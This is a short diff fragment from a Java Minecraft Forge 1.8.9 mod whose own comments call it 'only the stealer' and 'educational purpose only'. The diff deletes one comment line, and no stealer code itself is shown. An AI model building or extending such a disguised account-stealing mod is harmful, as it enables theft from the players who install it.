@@ -19,7 +19,7 @@ import java.net.URL;
 // EDUCATIONAL PURPOSE ONLY
 // MADE FOR 1.8.9
 // THIS IS ONLY THE STEALER
-// I WILL NOT UPLOAD ANYTHING ELSE BESIDES THAT!!! 
+
 
 @Mod(modid = "sbec") // some random modid
 public class sbec{
